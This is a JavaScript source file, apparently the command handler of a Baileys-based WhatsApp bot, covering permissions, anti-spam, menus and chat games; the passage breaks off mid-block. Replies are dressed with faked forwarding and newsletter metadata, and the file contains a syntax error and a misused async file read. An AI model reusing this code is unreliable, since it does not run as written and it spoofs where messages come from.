's // Start/LordPromise.js
// ==== { STARTER LOGIC } ======= \\

process.on('uncaughtException', (err) => {
    console.error('[Error] An uncaught exception occurred:', err);
    process.exit(1);
});
process.on('unhandledRejection', (err) => {
    console.error('[Error] Unhandled Rejection at:', err);
    process.exit(1);
});
const path = require('path');
require(path.join(__dirname, '..', 'settings', 'config'));

// ============= { END } ========= \\

// ================================================================== { BASIC REQUIRED "modules", "functions", Declarations" etc. } using commonjs                             ========================================================== \\

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@heavstaltech/baileys");
const { generateWAMessageFromContent } = require('@heavstaltech/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeInMemoryStore,
makeWaSocket,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
jidNormalizedUser,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@heavstaltech/baileys");

const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const os = require('os');
const axios = require('axios');
const FormData = require("form-data");
const yts = require('yt-search');
const ytdl = require("@distube/ytdl-core");
const { downloader, search } = require('@heavstaltech/api');
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const cheerio = require('cheerio');
const fg = require('api-dylux');
const google = require('google-it');
const { igdl, fbdl} = require('btch-downloader');
const { spawn: spawn, exec } = require('child_process');

//END

//MODULE MESSAGE + PREFIX

module.exports = HeavstalTech = async (HeavstalTech, m, chatUpdate, store) => {
    try {
      var body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :

    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :

    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :


    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :

    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[Pesan sekali lihat]") :

    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[Pesan sementara]") :

    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);


const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';
            
        let budy = (typeof m.text == 'string' ? m.text : '');
        
        var prefix = global.prefix;
        
        // ===============================================================
// STICKER COMMAND HANDLER
// ===============================================================
if (m.mtype === 'stickerMessage' && m.msg.fileSha256) {
    // 1. Get the SHA-256 hash of the incoming sticker
    const stickerHash = Buffer.from(m.msg.fileSha256).toString('hex');
    // 2. Check if this hash exists in our LowDB
    const savedCommand = global.db.data.sticker_cmd[stickerHash];
    
    if (savedCommand) {
        // 3. If found, we overwrite the 'body' variable.
        // This makes the bot think the user typed the text instead of sending a sticker.
        // Auto-add prefix if the user saved "menu" but the bot needs ".menu"
        body = savedCommand.startsWith(prefix) ? savedCommand : prefix + savedCommand;
        
        // Update budy too for consistency
        budy = body;
        
        // (Optional) Log it so you know it worked
        // console.log(chalk.cyan(`[STICKER CMD] Executing: ${body}`));
    }
}
// ===============================================================
        
//================ END =============\\

const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
isLooseUrl,
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture,
buildStringToSign,
sign,
extractUrlsFromString,
someResponseCollector
} = require(path.join(__dirname, '..', 'System', 'Data1.js'));
const { isCloud } = require(path.join(__dirname, '..', 'System', 'Data1.js'));
const { color, bgcolor, Lognyong } = require(path.join(__dirname, '..', 'System', 'color.js'));

//END

/*
// Failed to work (dummy function)
 const getTargetJid = (m, text) => {
    let target;
    if (m.mentionedJid && m.mentionedJid.length > 0) {
        target = m.mentionedJid[0];
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else if (text) {
        target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return null; // No target found
    }
    return jidNormalizedUser(target);
}
*/

//=================================================// User Data

const settings = global.db.data.settings;
const chats = global.db.data.chats;
const users = global.db.data.users;

// User Data
const Owner = settings.owners;
const Premium = settings.premium;
const setsudo = settings.sudo;
const ban = settings.banned;
const BANNED_GROUP = settings.bannedChats;
//=================================================//

//=================================================// Bank Data
global.bankList = global.db.data.bankData; 
//=================================================//



// End //

// NEW LOGIC END
const qtod = m.quoted ? "true":"false"
const isCmd = typeof body === 'string' && body.startsWith(prefix);
const isCmd2 = typeof body === 'string' && !body.startsWith(prefix);
const commandText = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
const cmd = typeof body === 'string' && body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = typeof body === 'string' ? body.trim().split(/ +/).slice(1) : [];
const BotNum = await HeavstalTech.decodeJid(HeavstalTech.user.id)
const botNumber = BotNum
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const Allowed_Cmds = ["unbanchat", "unbangc", "banchat", "bangc"]
 if (m.isGroup && BANNED_GROUP.includes(m.chat) && command !== Allowed_Cmds) return;
const isSetsudo = setsudo.includes(m.sender);
const isOwner =  [BotNum, ...Owner, ...setsudo, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isCreator = [BotNum, ...Owner, ...setsudo, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const footer = global.footer
const text = q = args.join(" ")
const teks = text
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.key.remoteJid

const ReplyImageUrls = [
    "https://files.catbox.moe/g8pxls.png", "https://files.catbox.moe/0dt3vo.jpg",
    "https://files.catbox.moe/okmjlp.jpg", "https://files.catbox.moe/1klpds.jpg",
    "https://files.catbox.moe/zx7ide.jpg", "https://files.catbox.moe/szew7d.jpg",
    "https://files.catbox.moe/4irzt7.jpg", "https://files.catbox.moe/o7psaa.jpg"
];
const reply = async (text) => {
  const randomImage = ReplyImageUrls[Math.floor(Math.random() * ReplyImageUrls.length)];
  await HeavstalTech.sendMessage(m.chat, {
    text,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: `HEAVSTAL TECH`,
        body: `Reply Message`,
        mediaType: 3,
        thumbnailUrl: randomImage,
        sourceUrl: `https://youtube.com/@Heavstal_Tech`
      },
      forwardingScore: 9,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363402853491560@newsletter",
        newsletterName: "HEAVSTAL TECH",
      }
    }
  }, { quoted: m });
};
const Vreply = reply;
const isBan = ban.includes(m.sender || sender);
if (isBan) return Vreply(mess.only.ban);

const { antiSpam } = require(path.join(__dirname, '..', 'System', 'antispam.js'));

 /** antispam **/
if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return Vreply(`*「 SPAM DETECTOR ❗」*\n\nTo prevent spam please give a 2 seconds break after each command\n\n${footer}`)
}

if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return Vreply(`*「 SPAM DETECTOR ❗」*\n\nTo prevent spam please give a 2 seconds break after each command\n\n${footer}`)
}

if (isCmd && !isCreator) antiSpam.addFilter(from)
        
// ========= { NEW } ============ \\  
        
async function sendImage(imageUrl, caption) {
  HeavstalTech.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption,
    contextInfo: {
      forwardingScore: 9,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363402853491560@newsletter",
        newsletterName: "HEAVSTAL TECH",
      }
    }
  }, { quoted: m });
}

const upload = require(path.join(__dirname, '..', 'System', 'uploader.js'));
const edb = require(path.join(__dirname, '..', 'Start', 'edb.js'));
// ======= { MEDIA VISIBILITY } ===== \\

const promiseplay_url = 'https://files.catbox.moe/dvpme3.mp3';

// ============== { END } ========== \\

// ============ { SMART MENU FUNCTION } ============ \\
async function sendMenu(menuText) {
    const fakeForward = {
        key: {
            remoteJid: "120363402853491560@newsletter",
            fromMe: false,
            id: "FWDMSG-ID-001",
            participant: "0@s.whatsapp.net"
        },
        message: { conversation: "𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶" },
        messageTimestamp: Math.floor(Date.now() / 1000),
    };
    
    switch (global.menu) {
        case 'v1':
            const randomImageUrls = [
                "https://files.catbox.moe/g8pxls.png", "https://files.catbox.moe/0dt3vo.jpg",
                "https://files.catbox.moe/okmjlp.jpg", "https://files.catbox.moe/1klpds.jpg",
                "https://files.catbox.moe/zx7ide.jpg", "https://files.catbox.moe/szew7d.jpg",
                "https://files.catbox.moe/4irzt7.jpg", "https://files.catbox.moe/o7psaa.jpg"
            ];
            const selectedImageUrl = randomImageUrls[Math.floor(Math.random() * randomImageUrls.length)];
            
            await HeavstalTech.sendMessage(from, {
                image: { url: selectedImageUrl },
                caption: menuText,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363402853491560@newsletter",
                        newsletterName: "𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇"
                    }
                }
            }, { quoted: fakeForward });
            break;

        case 'v2': 
            await HeavstalTech.sendMessage(from, {
                image: { url: global.thumbnail },
                caption: menuText,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363402853491560@newsletter",
                        newsletterName: "𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇"
                    }
                }
            }, { quoted: fakeForward });
            break;

        case 'v3':
            await m.reply(menuText);
            break;
            
        default: 
            console.log("Invalid MENU_STYLE set, defaulting to v1.");
            const randomImageUrls2 = [
                "https://files.catbox.moe/g8pxls.png", "https://files.catbox.moe/0dt3vo.jpg",
                "https://files.catbox.moe/okmjlp.jpg", "https://files.catbox.moe/1klpds.jpg",
                "https://files.catbox.moe/zx7ide.jpg", "https://files.catbox.moe/szew7d.jpg",
                "https://files.catbox.moe/4irzt7.jpg", "https://files.catbox.moe/o7psaa.jpg"
            ];
            const selectedImageUrl2 = randomImageUrls2[Math.floor(Math.random() * randomImageUrls2.length)];
            
            await HeavstalTech.sendMessage(from, {
                image: { url: selectedImageUrl2 },
                caption: menuText,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363402853491560@newsletter",
                        newsletterName: "𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐓𝐄𝐂𝐇"
                    }
                }
            }, { quoted: fakeForward });
            break;
    }

    if (global.menu !== 'v3') {
        await sleep(2000);
        await HeavstalTech.sendMessage(from, { 
            audio: { url: promiseplay_url }, 
            mimetype: 'audio/mpeg' 
        }, { quoted: fakeForward });
    }
}

// ============== { END } ========== \\

// === { LOGIC TO IGNORE MENTION MESSAGE } === \\

const usageMessage = `*ᴘʀᴏᴄᴇss ғᴀɪʟᴇᴅ*\ɴᴛʜᴇ ᴘʀᴏᴄᴇss ʜᴀs ғᴀɪʟᴇᴅ ᴅᴜᴇ ᴛᴏ ɪɴᴄᴏʀʀᴇᴄᴛ ᴜsᴀɢᴇ. ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀᴄᴄᴏʀᴅɪɴɢʟʏ.\n*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} 234xxxxxxx`;

// ============== { END } ========\\

// =================================================================
// START: FINAL AND BULLETPROOF PERMISSION LOGIC
// =================================================================

const isGroup = m.isGroup;
let isAdmin = false;
let isBotAdmin = false;
let isGroupOwner = false;
let participants = []
let groupName = ""
let groupMetadata = ""

if (isGroup) {
       groupMetadata = await HeavstalTech.groupMetadata(from).catch(e => {});
     if (groupMetadata) {
                participants = groupMetadata.participants || [];
                groupName = groupMetadata.subject || "";
                const groupOwnerJid = groupMetadata.owner || '';
                isGroupOwner = areJidsSameUser(m.sender, groupOwnerJid);
                const senderIsAdminInList = participants.some(p => p.admin && areJidsSameUser(p.id, m.sender));
                isAdmin = senderIsAdminInList || isGroupOwner;
                const botIsAdminInList = participants.some(p => p.admin && areJidsSameUser(p.id, BotNum));
                isBotAdmin = botIsAdminInList || areJidsSameUser(BotNum, groupOwnerJid);
            }
}

/*

// Else use this

const isGroup = m.isGroup
    const groupMetadata = await HeavstalTech.groupMetadata(from).catch(e => {});
                const participants = groupMetadata.participants || [];
                const groupName = groupMetadata.subject || "";
                const groupOwnerJid = groupMetadata.owner || '';
               const isGroupOwner = areJidsSameUser(m.sender, groupOwnerJid);
                const senderIsAdminInList = participants.some(p => p.admin && areJidsSameUser(p.id, m.sender));
              const isAdmin = senderIsAdminInList || isGroupOwner;
                const botIsAdminInList = participants.some(p => p.admin && areJidsSameUser(p.id, BotNum));
              const isBotAdmin = botIsAdminInList || areJidsSameUser(BotNum, groupOwnerJid);

*/

// =================================================================
// END: FINAL PERMISSION LOGIC
// =================================================================

const pushname = m.pushName || "No Name"
const time = new Intl.DateTimeFormat('en-GB', {
    timeZone: global.timezone || 'Africa/Lagos',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
}).format(new Date());

const currentHour = parseInt(time.split(':')[0], 10);
let ucapanWaktu;
if (currentHour >= 5 && currentHour < 12) {
    ucapanWaktu = "Good Morning 🌅";
} else if (currentHour >= 12 && currentHour < 17) {
    ucapanWaktu = "Good Afternoon ☀️";
} else if (currentHour >= 17 && currentHour < 21) {
    ucapanWaktu = "Good Evening 🌇";
} else {
    ucapanWaktu = "Good Night 🌙";
}

const todayDateWIB = new Intl.DateTimeFormat('en-NG', {
    timeZone: global.timezone || 'Africa/Lagos',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
}).format(new Date());
// END

// ======= { OWNER NUMBERS } ==== \\

 
const lordpromise = '2348137256404'
const ownernumber = '2348137256404'
const ownernumber2 = '2348166546725'


/* const { lordpromise, ownernumber, ownernumber2 } = '2348137256404'
*/

// ========== { END } ============ \\

// ==== { Total Feature Logic } ===== \\
const totalFitur = () => {
    try {
        const filePath = path.join(__dirname, 'LordPromise.js'); 
        const mytext = fs.promises.readFile(filePath).toString();
        const numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    } catch (e) {
        console.error("Could not read LordPromise.js to count features:", e.message);
        return 0;
    }
};
        
// ========== { END } =========== //     

// OTHER STUFFS BY Heavstal Tech (NVM HERE THOUGH)

const { 
    remini, upscaleImage, 
    ytMp4, ytMp3, ytSearch, 
    getImageUrl, npmstalk, pinterest, 
    wallpaper, wikimedia, porno, hentai, 
    quotesAnime, igstalk, aiovideodl, umma, 
    ringtone, styletext, ephoto, searchVideo
} = require(path.join(__dirname, '..', 'System', 'Data3.js'));

// END 

// ============= { PING LOGIC } ==== \\
const { formatp } = require(path.join(__dirname, '..', 'System', 'Data1.js'));
const usedRam = formatp(os.totalmem() - os.freemem()); 
const totalRam = formatp(os.totalmem());
 // ============ { END } =========== \\

//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, videoToWebp, writeExifImg, writeExifVid, 
writeExif, addExif, audioCut, toAudio, toVideo, toPTT, ffmpeg, webp2mp4
} = require(path.join(__dirname, '..', 'System', 'Data2.js'));
//END

//SETTINGS STATUS BOT

if (!HeavstalTech.public) {
if (!m.key.fromMe && !isCreator && !isSetsudo) return;
        }
    
// --- END OF FIX ---

//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log Group Messages
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬Messages: ${m.body || m.mtype}\n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log Private Chat Messages 
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬Messages: ${m.body || m.mtype} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : Not A Group Message \n` +
      ` 🔑 Group Id : Not A Group Message \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END


//==================={ GAME HANDLER }==============================//

const tictactoeGames = {}; // Stores ongoing Tic-Tac-Toe games per chat
const hangmanGames = {};   // Stores ongoing Hangman games per chat
const hangmanVisual = [
    "😃🪓______", // 6 attempts left
    "😃🪓__|____",
    "😃🪓__|/___",
    "😃🪓__|/__",
    "😃🪓__|/\\_",
    "😃🪓__|/\\_", 
    "💀 Game Over!" // 0 attempts left 
];
        
// ================= WORD CHAIN INPUT HANDLER =================
global.wordChainGames = global.wordChainGames || new Map();

// Helper API Fetcher
async function isValidEnglishWord(word) {
    try {
        const response = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${word}`);
        if (!response.ok) return false;
        const data = await response.json();
        return Array.isArray(data) && data.length > 0;
    } catch (e) {
        return false;
    }
}

// Timer Manager
function startWordChainTimer(HeavstalTech, from, game) {
    if (game.turnTimeout) clearTimeout(game.turnTimeout);
    
    const timeAllowed = game.timeLimit * 1000;
    game.turnTimeout = setTimeout(async () => {
        if (!global.wordChainGames.has(from)) return;
        const loser = game.currentPlayer;
        
        const sortedPlayers = [...game.players].sort((a, b) => b.score - a.score);
        let scoresText = "";
        const mentions = [loser.id];
        
        sortedPlayers.forEach((p, i) => {
            mentions.push(p.id);
            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "▪️";
            scoresText += `${medal} @${p.id.split("@")[0]} → ${p.score} pts\n`;
        });
        
        await HeavstalTech.sendMessage(from, {
            text: `╭━━━━━━━━━━━━━━━╮\n│ 🔗 *WORD CHAIN - GAME OVER*\n├━━━━━━━━━━━━━━━┤\n│ ⏰ @${loser.id.split("@")[0]} ran out of time!\n├━━━━━━━━━━━━━━━┤\n│ 📊 *FINAL SCORES:*\n${scoresText}│ 📝 Total chain: ${game.chainLength} words\n│ 🔤 Words used: ${game.usedWords.size}\n╰━━━━━━━━━━━━━━━╯`,
            mentions
        });
        global.wordChainGames.delete(from);
    }, timeAllowed);
}

// The Interceptor
if (global.wordChainGames.has(from)) {
    const text = budy.trim();
    // Ignore bot's own UI elements
    if (!(text.includes("╭") || text.includes("│") || text.includes("╰") || text.startsWith("❌") || text.startsWith("✅"))) {
        const game = global.wordChainGames.get(from);
        let handled = false;
        
        // JOIN PHASE
        if (game.joinPhase && text.toLowerCase() === "join") {
            if (!game.addPlayer(m.sender)) {
                await HeavstalTech.sendMessage(from, { text: `⚠️ @${m.sender.split("@")[0]}, you already joined! (${game.players.length} players)`, mentions:[m.sender] });
            } else {
                await HeavstalTech.sendMessage(from, { text: `✅ @${m.sender.split("@")[0]} joined the Word Chain! (${game.players.length} players)\n\n_Type "join" to join..._`, mentions: [m.sender] });
            }
            handled = true;
        } 
        // GAME PHASE
        else if (!game.joinPhase) {
            const currentPlayer = game.currentPlayer;
            if (currentPlayer && currentPlayer.id === m.sender) {
                const word = text.toLowerCase().trim();
                handled = true; // We caught their input
                
                // 1. Check Format (Letters only)
                if (!/^[a-z]+$/.test(word)) {
                    await HeavstalTech.sendMessage(from, { text: `❌ Letters only! Hurry up, clock is ticking!` });
                } 
                // 2. Check Dynamic Length Limit
                else if (word.length < game.minWordLength) {
                    await HeavstalTech.sendMessage(from, { text: `❌ Word too short! Current minimum length is *${game.minWordLength} letters*. Keep trying!` });
                }
                // 3. Check if Used
                else if (game.usedWords.has(word)) {
                    await HeavstalTech.sendMessage(from, { text: `❌ *"${word}"* was already used! Think of another one!` });
                } 
                // 4. Check Chain Letter Rule
                else if (game.lastWord && word[0] !== game.lastWord.slice(-1)) {
                    await HeavstalTech.sendMessage(from, { text: `❌ Word must start with *"${game.lastWord.slice(-1).toUpperCase()}"*!` });
                } 
                // 5. Validate English Word API
                else {
                    const isValid = await isValidEnglishWord(word);
                    if (!isValid) {
                        await HeavstalTech.sendMessage(from, { text: `❌ *"${word}"* is not a valid English word! Try again!` });
                    } else {
                        // WORD IS FULLY VALID! 
                        clearTimeout(game.turnTimeout); // Stop their timer
                        game.acceptWord(word); // Register score and advance turn
                        
                        const nextPlayer = game.currentPlayer;
                        const nextLetter = word.slice(-1).toUpperCase();
                        
                        await HeavstalTech.sendMessage(from, {
                            text: `╭━━━━━━━━━━━━━━━╮\n│ 🔗 *WORD CHAIN*\n├━━━━━━━━━━━━━━━┤\n│ ✅ @${m.sender.split("@")[0]}: *${word}*\n│ 📊 +${word.length} pts (Total: ${currentPlayer.score})\n├━━━━━━━━━━━━━━━┤\n│ 🔤 Next letter: *${nextLetter}*\n│ 📏 Min Length: *${game.minWordLength} letters*\n│ 🎮 @${nextPlayer.id.split("@")[0]}'s turn\n│ ⏱️ ${game.timeLimit} seconds!\n│ 📝 Chain: ${game.chainLength} words\n╰━━━━━━━━━━━━━━━╯`,
                            mentions: [m.sender, nextPlayer.id]
                        });
                        
                        startWordChainTimer(HeavstalTech, from, game); // Start next player's timer
                    }
                }
            }
        }
        if (handled) return;
    }
}
// ============================================================ \\


// ============= { TTT GAME BEGINNING } ========= \\

this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // Vreply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                Vreply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) HeavstalTech.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            HeavstalTech.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
                
// ============ { END OF TTT GAME } ========= \\  

// ============================================================
// GAME INTERCEPTOR (Math & EmojiQuiz)
// ============================================================
this.game = this.game ? this.game : {};
if (this.game[m.chat] && !isCmd) {
    let gameSession = this.game[m.chat];
    let userResponse = budy.toLowerCase().trim().replace(prefix, "");

    if (userResponse === gameSession.answer.toString().toLowerCase()) {
        clearTimeout(gameSession.timeout);
        const reward = gameSession.type === 'math' ? 250 : 500;
        
        if (!global.db.data.chats[m.chat]?.economy) {
            return Vreply(`Economy System Has Not Been Actived In This Chat, Use *${prefix}economy on* to activate it and use this command`)
            else {
            await edb.give(m.sender, reward);
        }
        }

        if (gameSession.type === 'trivia' && !isCmd) {
    let choice = parseInt(userResponse);
    if (!isNaN(choice) && choice > 0 && choice <= gameSession.options.length) {
        let selectedAnswer = gameSession.options[choice - 1];
        
        if (selectedAnswer === gameSession.correct) {
            clearTimeout(gameSession.timeout);
            const reward = 500;
            if (global.db.data.chats[m.chat]?.economy) await edb.give(m.sender, reward);

            let winMsg = `🎉 *CORRECT!* 🎉\n\n👤 *Winner:* @${m.sender.split('@')[0]}\n✅ *Answer:* ${selectedAnswer}\n💰 *Reward:* ₹${reward}\n\n${footer}`;
            await HeavstalTech.sendMessage(m.chat, { text: winMsg, mentions: [m.sender] }, { quoted: m });
            delete this.game[m.chat];
            return;
        }
    }
        }

